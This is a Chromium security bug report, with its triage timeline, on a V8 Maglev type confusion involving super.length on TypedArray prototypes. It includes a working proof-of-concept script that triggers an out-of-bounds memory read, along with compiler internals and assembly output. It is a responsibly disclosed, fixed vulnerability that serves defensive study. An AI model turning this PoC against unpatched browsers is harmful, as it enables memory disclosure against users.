# Type Confusion Vulnerability in Maglev When Handling TypedArray Length Loading

| Field | Value |
|-------|-------|
| **Issue ID** | [402646504](https://issues.chromium.org/issues/402646504) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2025-03-12 |
| **Bounty** | $6,000.00 |

## Description

VULNERABILITY DETAILS

## 1 Interpreted Execution

After setting `obj.__proto__ = u16Arr` and interpreting the execution of `arrowFunc`, `super.length` will call `builtins TypedArrayPrototypeLength` for processing, where the `receiver` is the object `obj`. Since `obj` is not a `TypedArray` object, it will throw a JavaScript exception and exit.

```
// ES6 #sec-get-%typedarray%.prototype.length
TF_BUILTIN(TypedArrayPrototypeLength, TypedArrayBuiltinsAssembler) {
  const char* const kMethodName = "get TypedArray.prototype.length";
  auto context = Parameter<Context>(Descriptor::kContext);  
  auto receiver = Parameter<Object>(Descriptor::kReceiver);    // obj

  ThrowIfNotInstanceType(context, receiver, JS_TYPED_ARRAY_TYPE, kMethodName);
  ...
}

```

It's important to note: **Although the execution of `TypedArrayPrototypeLength` fails, the property lookup process is successful, so an additional item will be added to the feedback slot corresponding to `super.length`, becoming a polymorphic IC**.

Below is the feedback vector of the `arrowFunc` function after two interpretative executions, where the key is the map of the `receiver` prototype object, that is, the map of the `obj.__proto__`.

```
 - slot #0 LoadProperty POLYMORPHIC
   [weak] 0x12b70018200d <Map[28](HOLEY_ELEMENTS)>: LoadHandler(Smi)(kind = kNonExistent)
   [weak] 0x12b700199c79 <Map[60](UINT8ELEMENTS)>: LoadHandler(do access check on lookup start object = 0, lookup on lookup start object = 0, kind = kAccessorFromPrototype, data1 = [weak] 0x12b700183661 <JSFunction get length (sfi = 0x12b700030d0d)>, validity cell = 0x12b700199ca1 <Cell value= 0>) {
     [0]: 0x12b700048c09 <WeakFixedArray[4]>
     [1]: 0x12b700000e21 <Symbol: (uninitialized_symbol)>
  }

```
## 2 Maglev Graph Building

The bytecode for `super.length` is `GetNamedPropertyFromSuper <receiver> <name_index> <slot>`, where:

- `<receiver>` is `obj`
- `<name_index>` is `"length"`
- `<ra>`, also known as `home_obj`, is also `obj`

The crash occurs during the process of Maglev handling this bytecode.

```
ReduceResult MaglevGraphBuilder::VisitGetNamedPropertyFromSuper() {
  // GetNamedPropertyFromSuper <receiver> <name_index> <slot>
  ValueNode* receiver = LoadRegister(0);      // obj
  ValueNode* home_object = GetAccumulator();    // obj
  compiler::NameRef name = GetRefOperand<Name>(1);    // "length"
  FeedbackSlot slot = GetSlotOperand(2); 
  compiler::FeedbackSource feedback_source{feedback(), slot};

  // Get the prototype object of the home_object, which is obj.__proto__, 
  // and the property search will start from here.
  ValueNode* home_object_map =
      BuildLoadTaggedField(home_object, HeapObject::kMapOffset);
  ValueNode* lookup_start_object =
      BuildLoadTaggedField(home_object_map, Map::kPrototypeOffset);
  ...

  PROCESS_AND_RETURN_IF_DONE(
      TryBuildLoadNamedProperty(
        receiver,     // obj
        lookup_start_object,    // obj.__proto__, i.e. u8Arr
        name,    // "length"
        feedback_source, build_generic_access),
      SetAccumulator);
  // Create a generic load.
  SetAccumulator(build_generic_access());
  return ReduceResult::Done();
}

```

Subsequently, it will call `MaglevGraphBuilder::TryBuildPropertyLoad()` to generate corresponding nodes for property load. This is where the crash happens.

```
MaybeReduceResult MaglevGraphBuilder::TryBuildPropertyLoad(
    ValueNode* receiver, ValueNode* lookup_start_object, compiler::NameRef name,
    compiler::PropertyAccessInfo const& access_info) {
  if (access_info.holder().has_value() && !access_info.HasDictionaryHolder()) {
    broker()->dependencies()->DependOnStablePrototypeChains(
        access_info.lookup_start_object_maps(), kStartAtPrototype,
        access_info.holder().value());
  }

  switch (access_info.kind()) {
    case ...
    case compiler::PropertyAccessInfo::kTypedArrayLength: { // here
      DCHECK_EQ(receiver, lookup_start_object);  
      CHECK(!IsRabGsabTypedArrayElementsKind(access_info.elements_kind()));
      return BuildLoadTypedArrayLength(receiver, access_info.elements_kind());
    }
  }
}

```

Since `obj.__proto__ = u8Arr`, `obj.length` will load the `length` property of `u8Arr`, so `access_info.kind() = kTypedArrayLength`.

`TryBuildPropertyLoad()` assumes that `receiver` and `lookup_start_object` are the same node, but in reality:

- `receiver` is `obj`
- `lookup_start_object` is `obj.__proto__`, which is `u8Arr`

`receiver` and `lookup_start_object` are not the same, hence the crash.

This is actually a type confusion issue: **In IC, the key being `TypedArrayMap` can only guarantee that `start_lookup_object` is a `TypedArray`, it cannot guarantee that `receiver` is also a `TypedArray`. However, `TryBuildPropertyLoad` assumes that both are `TypedArray`.**

I speculate that the exception thrown in `builtins TypedArrayPrototypeLength` may have misled developers, leading them to mistakenly think that `kTypedArrayLength` can only apply when `receiver` is a `TypedArray`, and therefore infer that the cache in the Feedback Slot is also the same.

## 3. OOB Read

In the release build of v8, it does not crash, but constructs the following Maglev graph.

```
        // n7 is receiver, i.e obj
     7: LoadTaggedFieldForContextSlot(0x10, compressed) [n2:(x)] → (x), 3 uses
        ...
        // n13 is map of obj.__proto__
    10: LoadTaggedField(0x0, compressed) [n9:(x)] → (x), 1 uses
    11: LoadTaggedField(0x10, compressed) [n10:(x)] → (x), 3 uses
        ↱ eager @7 (4 live vars)
    12: CheckHeapObject [n11:(x)]
    13: LoadTaggedField(0x0, compressed) [n11:(x)] → (x), 1 uses
╭───15: BranchIfReferenceEqual [n13:(x), n14:(x)] b3 b4
│    ↓
│  Block b3
│╭──16: Jump b5
││      with gap moves:
││        - n4:(x) → 21: φᵀ r0 (x)
││
╰─►Block b4    // <== if map of obj.__proto__ is Uint8ArrayMap
 │      ↱ eager @7 (4 live vars)
 │  17: CheckMaps(0x12b700199c79 <Map[60](UINT8ELEMENTS)>) [n11:(x)]
 │  18: LoadTypedArrayLength [n7:(x)] → (x), 1 uses
 │  20: IntPtrToNumber [n18:(x)] → (x), 1 uses

```

In which:

- Node `n7` is `obj`, which is a `JSObject` object.
- Because it is mistakenly assumed that `receiver` is also a `TypedArray` object, `n7` will be taken as the input of the `LoadTypedArrayLength` node, trying to output its length.
- Finally, the `IntPtrToNumber` node will convert the read length into a `Number` type as the return value of `super.length`.

When generating instructions, `LoadTypedArrayLength` will try to load the `JSTypedArray::kRawByteLengthOffset` field.

```
void LoadTypedArrayLength::GenerateCode(MaglevAssembler* masm,
                                        const ProcessingState& state) {
  Register object = ToRegister(receiver_input());
  Register result_register = ToRegister(result());
  ...
  __ LoadBoundedSizeFromObject(result_register, object,
                               JSTypedArray::kRawByteLengthOffset);
  int shift_size = ElementsKindToShiftSize(elements_kind_);
  if (shift_size > 0) {
    // TODO(leszeks): Merge this shift with the one in LoadBoundedSize.
    DCHECK(shift_size == 1 || shift_size == 2 || shift_size == 3);
    __ shrq(result_register, Immediate(shift_size));
  }
}

```

The final assembly instructions generated are as follows, which will load 8 bytes from the position offset `+0x20` from the starting address of `obj`. Since `obj` only has `0x10` bytes, this will cause an OOB read problem.

```
                  --   18: LoadTypedArrayLength [v9/n7:[rcx|R|t]] → [rax|R|w64], live range: [19-20] - Process@../../src/maglev/maglev-code-generator.cc:801
0x5555b7e400ae    6e  488b411f             REX.W movq rax,[rcx+0x1f]
0x5555b7e400b2    72  48c1e81d             REX.W shrq rax, 29

```

In fact, if you run poc.js in the release build of v8, it will finally output an integer. This integer is the result of the OOB read.

VERSION

Since this issue is introduced by Maglev in handling TypedArray Length Loading, I believe this vulnerability was introduced in commit `e74bcecfb1b70a4aaa8f96feb818d02c668e5650`.

REPRODUCTION CASE

poc.js:

```
const obj = {
    func(prepare, optimize) {
        const arrowFunc = () => {
            /**
             *  The 'super' in an arrow function inherits from the outer scope, same as the 'super' in `func`
             *  'super' points to the object the function belongs to, `func` belongs to `obj`, therefore 'super' points to `obj`
             */
            return super.length;
        };

        if(prepare) {
            %PrepareFunctionForOptimization(arrowFunc);
        }
        if(optimize) {
            %OptimizeMaglevOnNextCall(arrowFunc);
        }

        return arrowFunc();
    }
};

/**
 *  Create polymorphic IC for super.length
 */
try {
    /**
     *  'super' points to obj, obj.__proto__ = Object.prototype
     *  Therefore, a monomorphic IC will be added to the Feedback Slot of super.length, with key as Object.prototype.map
     */
    obj.func(true, false);
} catch (e) {
    print(e);
}

const u8Arr = new Uint8Array(20);
obj.__proto__ = u8Arr;
try {
    /**
     *  'super' points to obj, obj.__proto__ = u8Arr
     *  Although super.length will throw a js exception due to TypedArrayPrototypeLength and execution fails,
     *  an IC will still be added, becoming a polymorphic IC, containing two keys:
     *      1. map of Object.prototype
     *      2. map of u8Arr
     */
    obj.func(true, false);
} catch (e) {
    print(e);
}

// Triggering crash through Maglev optimization
print(obj.func(false, true));

```

run with debug compiled v8:

```
./d8 \
    --allow-natives-syntax \
    ./poc.js

```

v8 will crash like that:

```
#
# Fatal error in ../../src/maglev/maglev-graph-builder.cc, line 6008
# Debug check failed: receiver == lookup_start_object (0x51e36fe4ce20 vs. 0x51e36fe4d160).
#

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### cl...@appspot.gserviceaccount.com (2025-03-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6371027042893824.

### ke...@chromium.org (2025-03-12)

Thanks for the report.

Assigning to sroettger@ for V8 triage.

FoundIn not yet set as the regression range analysis is still in progress.

### 24...@project.gserviceaccount.com (2025-03-12)

Detailed Report: https://clusterfuzz.com/testcase?key=6371027042893824

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  receiver == lookup_start_object in maglev-graph-builder.cc
  v8::internal::maglev::MaglevGraphBuilder::TryBuildPropertyLoad
  v8::internal::maglev::MaglevGraphBuilder::VisitGetNamedPropertyFromSuper
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98728:98729

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6371027042893824

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ma...@chromium.org (2025-03-13)

The report looks legit; this seems to be an OOB read where we read from an object as if it was a TypedArray (reading from the offset where the length would've been if it was a TypedArray).

Fix attempt: <https://chromium-review.googlesource.com/6348468>

### ma...@chromium.org (2025-03-13)

Lowering severity as this is just leaking values.

### ch...@google.com (2025-03-13)

Setting milestone because of s2 severity.

### ch...@google.com (2025-03-13)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### 24...@project.gserviceaccount.com (2025-03-14)

ClusterFuzz testcase 6371027042893824 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=99241:99242

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### ch...@google.com (2025-03-14)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M135. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [135].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ma...@chromium.org (2025-03-17)

1. Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/c/v8/v8/+/6348468>

2. Has this fix been verified on Canary to not pose any stability regressions?

Has been shipped to Canary, no known crashes got routed back to me.

3. Does this fix pose any potential non-verifiable stability risks?

None known.

4. Does this fix pose any known compatibility risks?

No

5. Does it require manual verification by the test team? If so, please describe required testing.

No

### am...@chromium.org (2025-03-18)

<https://chromium-review.googlesource.com/c/v8/v8/+/6348468> approved for merge to M135, please merge to 13.5 at your earliest convenience

### sp...@google.com (2025-03-21)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $6000.00 for this report.

Rationale for this decision:
$5,000 for high-quality report of memory read / user information disclosure + $1,000 bisect bonus 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-03-21)

Congratulations [303f06e3]! Thank you for the very high quality report of this issue and reporting it to us -- great work!

### da...@google.com (2025-03-25)

Merge CL: https://chromium-review.googlesource.com/c/v8/v8/+/6368521

### pe...@google.com (2025-03-25)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2025-03-26)

Labelling as not applicable for LTS 132 and 126 because the suspected CLs[1][2]  isn't present in M132 and M126.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/6276864
[2] https://chromium-review.googlesource.com/c/v8/v8/+/6275486

### ch...@google.com (2025-06-21)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> $5,000 for high-quality report of memory read / user information disclosure + $1,000 bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/402646504)*
